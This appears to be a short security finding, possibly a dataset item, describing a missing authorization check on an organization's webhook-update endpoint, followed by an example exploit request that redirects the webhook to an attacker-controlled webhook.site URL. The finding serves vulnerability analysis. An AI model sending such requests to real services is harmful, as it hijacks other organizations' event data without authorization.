diagnosis: The endpoint updates the runtime outbound webhook target URL in django-constance for org_id. It fails to check if request.user is an authorized administrator of org_id, allowing malicious users to redirect critical business event webhooks to an attacker-controlled endpoint.
exploit_request:
PUT /api/organizations/772/webhooks/dispatcher/ HTTP/1.1
Host: events.billingmesh.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"webhook_url": "https://webhook.site/attacker-uuid"}
